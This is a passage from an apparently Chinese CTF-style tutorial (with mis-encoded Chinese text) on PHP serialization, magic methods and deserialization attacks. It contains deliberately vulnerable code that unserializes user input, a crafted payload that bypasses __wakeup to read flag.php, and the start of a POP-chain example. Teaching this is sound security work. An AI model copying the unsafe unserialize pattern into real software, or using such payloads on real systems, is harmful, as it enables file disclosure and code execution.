<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡º</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"test"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"&lt;0x00&gt;&lt;test&gt;&lt;0x00&gt;flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"flag1"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"aaa"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"&lt;0x00&gt;*&lt;0x00&gt;c"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"ccc"</span>;&#125;</span><br></pre></td></tr></table></figure><p>0:4:â€testâ€:4<br>ä»£è¡¨ Oä¸ºå¯¹è±¡ ç«™å››ä¸ªå­—ç¬¦ä¸ºtest æœ‰4ä¸ªå±æ€§<br>{} é‡Œé¢çš„ä¸º å±æ€§æ˜µç§° å’Œ å±æ€§å€¼<br>æ ¼å¼:{ç±»å‹:å˜é‡é•¿åº¦:â€å˜é‡åâ€ï¼›ç±»å‹:å˜é‡å€¼é•¿åº¦:â€å˜é‡å€¼â€}  //å…­ä¸ª : ä¸ºä¸€ç»„ å‰ä¸‰ä¸ªä»£è¡¨å±æ€§å åä¸‰ä¸ªä»£è¡¨å±æ€§å€¼</p><p>æ³¨:<br>ç§æœ‰å±æ€§ä¼šåœ¨ textä¸¤è¾¹åŠ ä¸Šç©ºå­èŠ‚ æ‰€ä»¥é•¿åº¦ä¸º10<br>ä¿æŠ¤å±æ€§åŒæ ·ä¹Ÿä¼šåœ¨*ä¸¤è¾¹åŠ ç©ºå­—èŠ‚<0x00><0x00></0x00></0x00></p><p><strong>è¿›è¡Œååºåˆ—åŒ–</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data1</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$data1</span>.<span class="string">"\n"</span>;  <span class="built_in">echo</span> åªèƒ½è¾“å‡ºå­—ç¬¦ä¸²ä¸”ä¸æ¢è¡Œ  æ‰€ä»¥è¾“å‡ºå¯¹è±¡æ—¶ä¼šæŠ¥é”™</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$data1</span>);</span><br></pre></td></tr></table></figure><pre><code>object(test)#2 (4) {  [&quot;flag&quot;:&quot;test&quot;:private]=&gt;  string(3) &quot;123&quot;  [&quot;flag1&quot;]=&gt;  string(3) &quot;123&quot;  [&quot;a&quot;]=&gt;  string(3) &quot;aaa&quot;  [&quot;c&quot;:protected]=&gt;  string(3) &quot;ccc&quot;}</code></pre><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p><strong>__sleep()</strong><br>åœ¨è¿›è¡Œåºåˆ—åŒ–çš„æ—¶å€™<br>serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯</p><p>é€šä¿—çš„è®²å°±æ˜¯ å¯¹è±¡çš„å“ªäº›å±æ€§åº”è¯¥è¢«åºåˆ—åŒ–<br><strong>sleepæ–¹æ³•<strong>å¿…é¡»è¿”å›ä¸€ä¸ªæ•°ç»„</strong>,åŒ…å«éœ€è¦ä¸²è¡ŒåŒ–çš„å±æ€§. PHPä¼šæŠ›å¼ƒå…¶å®ƒå±æ€§çš„å€¼. å¦‚æœæ²¡æœ‰</strong>sleepæ–¹æ³•,PHPå°†ä¿å­˜æ‰€æœ‰å±æ€§.</p><p><strong>__wakeup()</strong><br>unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <strong>wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ </strong>wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚<br><strong>wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ï¼Œä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥ï¼Œæˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œã€‚<br>é€šä¿—è®²å°±æ˜¯è¿˜ä¼šå¯¹</strong>wakeupé‡Œé¢çš„å±æ€§è¿›è¡Œååºåˆ—åŒ–</p><p>è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½ä¸æ¥å—å‚æ•°,</p><p><strong>å®ä¾‹</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ID = $ID;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sex = $sex;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;age = $age;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"aaa"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"bbb"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];  <span class="comment">// info å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;c = <span class="string">"ccc"</span>;  <span class="comment">// å±æ€§cä¼šè¢«åºåˆ—åŒ– å±æ€§aä¸ä¼š</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me-&gt;getInfo();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//å­˜åœ¨__sleep()å‡½æ•°ï¼Œ$infoå±æ€§ä¸ä¼šè¢«å­˜å‚¨</span></span></span><br><span class="line"><span class="php">$temp = serialize($me);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $temp . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = unserialize($temp);  <span class="comment">// infoå±æ€§ä¹Ÿä¼šè¢«ååºåˆ—åŒ–</span></span></span><br><span class="line"><span class="php"><span class="comment">//__wakeup()ç»„è£…çš„$info</span></span></span><br><span class="line"><span class="php">var_dump($me);</span></span><br><span class="line"><span class="php"><span class="comment">//$me-&gt;getInfo();</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>__toString()</strong></p><p>__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p><p>å°±æ˜¯å½“ä½¿ç”¨  echo å¯¹è±¡å    å› ä¸ºechoåªèƒ½ç”¨æ¥è¾“å‡ºå­—ç¬¦ä¸² å½“ç”¨åœ¨è¾“å‡ºå¯¹è±¡æ—¶,å°±ä¼šåœ¨ç±»é‡Œé¢å¯»æ‰¾__toString()  è¾“å‡ºè¿™ä¸ªæ–¹æ³•çš„è¿”å›å€¼<br><strong>å®ä¾‹</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">xiaoyang</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $xiaoyang;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($xiaoyang)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;xiaoyang = $xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"-----------------"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> xiaoyang(<span class="string">'hello xiaoyang'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="   è¾“å‡º:"></a>   è¾“å‡º:</h2><pre><code>hello xiaoyang[Finished in 0.1s]</code></pre><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><h3 id="ç»•è¿‡-wakeup"><a href="#ç»•è¿‡-wakeup" class="headerlink" title="ç»•è¿‡__wakeup()"></a>ç»•è¿‡__wakeup()</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)  </span></span><br><span class="line"><span class="php">      <span class="comment">//strchr()è¿”å›/åŠå…¶å‰©ä½™çš„éƒ¨åˆ†  strstr()çš„åˆ«å</span></span></span><br><span class="line"><span class="php">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span></span><br><span class="line"><span class="php">      <span class="comment">// show_source()   åˆ«å highlight_file()   æµ‹è¯•æ–‡ä»¶ è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºï¼š</span></span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">''</span> ;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;     </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span></span><br><span class="line"><span class="php">  show_source(<span class="string">'index.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">  $file=base64_decode($_GET[<span class="string">'file'</span>]);</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> unserialize($file);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span> #<span class="comment">&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>destruct()æ–¹æ³•ä¼šè¯»å–æ–‡ä»¶<br>æ€è·¯å¤§æ¦‚å°±æ˜¯æ„é€ åºåˆ—åŒ–å¯¹è±¡ç„¶åbase64ç¼–ç ä¼ å…¥ï¼Œç»è¿‡unserializeå°†fileè®¾ä¸ºflag.phpï¼Œä½†æ˜¯</strong>wakeupä¼šåœ¨unserializeä¹‹å‰æ‰§è¡Œï¼Œæ‰€ä»¥è¦ç»•è¿‡è¿™ä¸€ç‚¹ã€‚</p><p>å½“åºåˆ—åŒ–å±æ€§è¦å¤§äºçœŸå®å±æ€§çš„ä¸ªæ•°æ—¶, ä¼šè·³è¿‡__wakeup()</p><p>å…ˆæ„é€ åºåˆ—åŒ–<br>æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO:5:â€SoFunâ€:1:{S:7:â€\00*\00fileâ€;s:8:â€flag.phpâ€;}</p><p>å†ä¿®æ”¹å±æ€§å€¼<br>æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼šO:5:â€SoFunâ€:2:{S:7:â€\00*\00fileâ€;s:8:â€flag.phpâ€;}</p><p><strong>æ³¨:</strong><br>å› ä¸ºfileæ˜¯protectå±æ€§ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š\00*\00ã€‚å†base64ç¼–ç ã€‚</p><h3 id="sessionååºåˆ—åŒ–æ¼æ´"><a href="#sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionååºåˆ—åŒ–æ¼æ´"></a>sessionååºåˆ—åŒ–æ¼æ´</h3><h2 id="POPé“¾æ„é€ "><a href="#POPé“¾æ„é€ " class="headerlink" title="POPé“¾æ„é€ "></a>POPé“¾æ„é€ </h2><p><strong>ç±»çš„æ„æˆ</strong><br>ç±»æˆå‘˜åŒ…æ‹¬ç”±å±æ€§å’Œæ–¹æ³•æ„æˆï¼Œç±»å±æ€§å­˜åœ¨äºæ•°æ®æ®µï¼Œç±»æ–¹æ³•å­˜åœ¨äºä»£ç æ®µï¼Œå¯¹äºä¸€ä¸ªç±»æ¥è¯´ï¼Œç±»çš„æ–¹æ³•ä¸å ç”¨ç±»çš„ç©ºé—´ï¼Œå ç©ºé—´çš„åªæœ‰ç±»çš„å±æ€§</p><p><strong>æ¦‚å¿µ</strong><br>åœ¨äºŒè¿›åˆ¶åˆ©ç”¨æ—¶ï¼ŒROP é“¾æ„é€ ä¸­æ˜¯å¯»æ‰¾å½“å‰ç³»ç»Ÿç¯å¢ƒä¸­æˆ–è€…å†…å­˜ç¯å¢ƒé‡Œå·²ç»å­˜åœ¨çš„ã€å…·æœ‰å›ºå®šåœ°å€ä¸”å¸¦æœ‰è¿”å›æ“ä½œçš„æŒ‡ä»¤é›†ï¼Œè€Œ POP é“¾çš„æ„é€ åˆ™æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚<br>äºŒè¿›åˆ¶ä¸­é€šå¸¸æ˜¯ç”±äºå†…å­˜æº¢å‡ºæ§åˆ¶äº†æŒ‡ä»¤æ‰§è¡Œæµç¨‹ï¼Œè€Œååºåˆ—åŒ–è¿‡ç¨‹å°±æ˜¯æ§åˆ¶ä»£ç æ‰§è¡Œæµç¨‹çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå‰æï¼šè¿›è¡Œååºåˆ—åŒ–çš„æ•°æ®èƒ½å¤Ÿè¢«ç”¨æˆ·è¾“å…¥æ‰€æ§åˆ¶ã€‚</p><p><strong>POPé“¾åˆ©ç”¨</strong><br>ä¸€èˆ¬çš„åºåˆ—åŒ–æ”»å‡»éƒ½åœ¨PHPé­”æœ¯æ–¹æ³•ä¸­å‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œå› ä¸ºè‡ªåŠ¨è°ƒç”¨è§¦å‘æ¼æ´ï¼Œä½†å¦‚æœå…³é”®ä»£ç æ²¡åœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯åœ¨ä¸€ä¸ªç±»çš„æ™®é€šæ–¹æ³•ä¸­ã€‚è¿™æ—¶å€™å°±å¯ä»¥é€šè¿‡æ„é€ POPé“¾å¯»æ‰¾ç›¸åŒçš„å‡½æ•°åå°†ç±»çš„å±æ€§å’Œæ•æ„Ÿå‡½æ•°çš„å±æ€§è”ç³»èµ·æ¥<br><strong>æŒ–æ˜æ€è·¯</strong><br>èƒ½æ§åˆ¶ååºåˆ—åŒ–çš„ç‚¹<br>ååºåˆ—åŒ–ç±»æœ‰é­”æœ¯æ–¹æ³•<br>é­”æœ¯æ–¹æ³•é‡Œæœ‰æ•æ„Ÿæ“ä½œï¼ˆå¸¸è§„æ€è·¯ï¼‰<br>é­”æœ¯æ–¹æ³•é‡Œæ— æ•æ„Ÿæ“ä½œï¼Œä½†æ˜¯é€šè¿‡å±æ€§ï¼ˆå¯¹è±¡ï¼‰è°ƒç”¨äº†ä¸€äº›å‡½æ•°ï¼Œæ°å·§åœ¨å…¶ä»–çš„ç±»ä¸­æœ‰åŒåçš„å‡½æ•°ï¼ˆpopé“¾ï¼‰</p><p><strong>ä¾‹å­</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"å­—ç¬¦ä¸²æ‹¼æ¥"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_GET[<span class="string">'string'</span>];</span></span><br><span class="line"><span class="php">unserialize($a);</span></span><br><span class="line"><span 